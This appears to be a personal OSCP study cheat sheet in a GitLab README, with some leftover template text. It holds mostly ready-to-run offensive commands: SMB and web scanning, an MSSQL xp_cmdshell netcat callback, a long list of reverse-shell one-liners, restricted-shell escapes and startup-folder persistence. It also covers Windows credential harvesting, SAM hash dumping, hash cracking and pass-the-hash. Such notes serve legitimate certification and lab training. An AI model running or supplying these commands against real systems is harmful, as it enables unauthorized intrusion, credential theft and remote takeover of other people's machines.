# Crushing OSCP Notes

Christian Galvan | March 17th, 2022

## Getting started

To make it easy for you to get started with Gitlab, here's a list of recommended next steps.

Already a pro? Just edit this README.md and make it your own. Want to make it easy? [Use the template at the bottom](#editing-this-readme)!

## Add your files

- [ ] [Create](https://docs.Gitlab.com/ee/user/project/repository/web_editor.html#create-a-file) or [upload](https://docs.Gitlab.com/ee/user/project/repository/web_editor.html#upload-a-file) files
- [ ] [Add files using the command line](https://docs.Gitlab.com/ee/Gitlab-basics/add-file.html#add-a-file-using-the-command-line) or push an existing Git repository with the following command:

```
cd existing_repo
git remote add origin https://github.com/Pwn20wn/CrushingOSCP.git
git branch -M main
git push -uf origin main
```
## Tools to Download
- [] LinPeas
- [] JuicyPotato
- [] Seclists
- [] Sherlock
- [] PowerUp

## Don't reinvent the wheel
- [] 
## Reference Links
### Web Recon
```
```
### Network Recon
```
```
### Look for LHF CVE's
```
nmap -A -p 139,445 10.11.1.1-254 -oG smb_results.txt

cat smb_results.txt | grep -i windows | cut -d" " -f2

cat smb_results.txt | grep -i open | cut -d" " -f2 > smb_server_all.txt

for vul in $(find / -name smb*vuln*.nse | cut -d"/" -f 6); do nmap -v -p 139,445 --script=$vul -iL smb_server_all.txt -oN smb_vulns_$vul.txt; done

```
### Searching Unauthenticated Access
```
```
### Web Enumeration
```
nmap -A -p80 --open 10.11.1.0/24 -oG nmap-scan_10.11.1.1-254

cat nmap-scan_10.11.1.1-254

cat nmap-scan_10.11.1.1-254 | grep 80

cat nmap-scan_10.11.1.1-254 | grep 80 | grep -v "Nmap"

cat nmap-scan_10.11.1.1-254 | grep 80 | grep -v "Nmap" | awk '{print $2}'

for ip in $(cat nmap-scan_10.11.1.1-254 | grep 80 | grep -v "Nmap" | awk '{print $2}'); do cutycapt --url=$ip --out=$ip.png;done ![image](https://user-images.githubusercontent.com/32726832/168017683-f53aedfb-8f65-4d11-86f1-e937c76de13a.png)

nmap --script http-enum.nse 10.11.1.133
nikto -h http://10.11.1.133
gobuster dir http://10.11.1.133 -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e

```
### Network Enumeration
```
```
### Gaining Access/Exploitation
```
nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=sa,ms-sql-xp-cmdshell.cmd="c:\\Users\Public\\nc.exe -e cmd.exe 192.168.119.x 4444" 10.11.1.x

```
### Creating Reverse Shells
https://www.revshells.com/
```
sh -i >& /dev/tcp/10.11.1.10/9001 0>&1
0<&196;exec 196<>/dev/tcp/10.10.10.10/9001; sh <&196 >&196 2>&196
exec 5<>/dev/tcp/10.10.10.10/9001;cat <&5 | while read line; do $line 2>&5 >&5; done
sh -i 5<> /dev/tcp/10.10.10.10/9001 0<&5 1>&5 2>&5
sh -i >& /dev/udp/10.10.10.10/9001 0>&1
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.10.10 9001 >/tmp/f
nc -e sh 10.10.10.10 9001
nc.exe -e sh 10.10.10.10 9001
nc -c sh 10.10.10.10 9001
ncat 10.10.10.10 9001 -e sh
ncat.exe 10.10.10.10 9001 -e sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|ncat -u 10.10.10.10 9001 >/tmp/f
rcat 10.10.10.10 9001 -r sh
perl -e 'use Socket;$i="10.10.10.10";$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'

```
### Escaping Restricted Shells

https://www.metahackers.pro/breakout-of-restricted-shell/

https://oscpnotes.infosecsanyam.in/My_OSCP_Preparation_Notes--Enumeration--SSH--rbash_shell_esacping.html
```
BASH_CMDS[a]=/bin/sh;a
2
export PATH=$PATH:/bin/
3
export PATH=$PATH:/usr/bin
```
### Post-Exploitation/Situational Awareness
```
Each user can define apps that start whem they first log in, by placing shortcuts to them in a specific directory
Windows also has a startup directory for apps that should start for all users:
	• C:\ProgramData\Microsoft\Windows\Stat Menu\Programs\StatUp
	• If we can create files in this directory we can use our reverse shell executable & escalate privs when an admin logs in

Example, put the reverse shell in the above directory or startup directory for admin
	• Listen for reverse shell on kali
	• Receive reverse shell

Use accesschk to see what users have write access
	• .\acesschk.exe /accepteula -d "C:\ProgramData\Microst\Windows\Start Menu\Programs\StartUp"
	• Files placed here must be shortcuts aka .LNK files 
	• The file below creates a shortcut using virtual basic script which sets the path to the reverse shell
	• 
	• To run it "cscript CreateShortcut.vbs"
	• Next run the listener
	• When the admin logs in again, it will execute the file set in the oLink.TargetPath
![image](https://user-images.githubusercontent.com/32726832/168018223-767f64d1-d3b8-4604-8949-e14c3f34798d.png)

```
### Windows PrivEsc

### Looking for Passwords
```
	• Several features of windows store password insecurely
	• Programs can store them in the registry
		○ Reg query HKLM /f password /t REG_SZ /s
		○ Reg query HKCU /f password /t REG_SZ /s
	• Autologon & putty saved sessions may be found
	• Winexe can be used to spawn a shell from kali machine
		○ Winexe -U 'admin%password' //ip cmd.exe
		○ Winexe -U 'admin%password' --system //ip cmd.exe
	• The following query may find passwords in the key name or the key value 
		○ Reg query HKLM /f password /t REG_SZ /S

	• Find saved creds with winpeas
		○ .\winPEASany.exe quiet cmd windowscreds
		○ Cmdkey /list
	• Send reverse shell with saved creds
		○ Runas /savecred /user:admin C:\PriveEsc\reverse.exe
	• Configuration files
		○ Unattend.xml
	• Recursively search for files in current directory with pass in name or end with the .config extension
		○ Dir /s *pass& == *.config
	• Recursively search for files in the current directory with password that also in with multiple extensions
		○ Findstr /si password &.xml *.ini *.txt
	
	• Looks for known files that may contain password information
		○ .\winPEASany.exe quiet cmd searchfast filesinfo
	• Windows stores password hashes in the Security Account Manager (SAM)
	• Hashes are encrypted with a key which can be found in a file named SYSTEM
	• Read access to the SAM & SYSTEM files can also allow you to extract the hashes
	• Pwdump needs to be the latest version to extract hashes from windows 10 
		○ Git clone https://github.com/Neohapsis/creddump7.git
		○ Python2 pwdump.py /tools/SYSTEM /tool/SAM
	• Crack hash for windows 10 passwords NTLM
		○ Hashcat -m 1000 --force hash /usr/share/wordlists/rockyou.txt
	• Windows Accepts hashes instead of passwords to authenticate to a number of services, this is known as pass the hash. Tools that can be used are:
		○ Winexe
		○ Pth-winexe 
	• Logon with admin user without cracking password, include entire hash
		○ Pth-winexe -U 'admin%alksjdflkjasdlfjlsadfj:aksjdlkfjalksdjflkadjs; //ip cmd.exe
		○ Pth-winexe --system -U 'admin%alksjdflkjasdlfjlsadfj:aksjdlkfjalksdjflkadjs; //ip cmd.exe
		
![image](https://user-images.githubusercontent.com/32726832/168018025-b107690c-9422-4832-accd-5865a23c89d4.png)
```
### Linux PrivEsc
```
General Concepts

Our ultimate goal with privesc in Linux is to gain a shell running as the root user

It can be simple such as a kernel exploit or it may require a lot of reconnaissance on the compromised system
	• In certain cases it may not only be one misconfig, but require you to think and combine multiple misconfigurations
	• All privilege escalations are effectively examples of access control violations
	• Access control and user permissions are intrinsically linked
When focusing on privesc in linux, understanding how linux handles permissions is very important![image](https://user-images.githubusercontent.com/32726832/168018391-4e6c1f16-ede6-425f-9796-f6516e5cc64a.png)

```
### Clean Up
```
Rules of the game is to maintain operational security. Delete any applications which where uploaded to the victim host after you're down whether it's a reverse shell, file uploaded through web vulnerability, password extraction tools, or post exploitation scripts. 
```

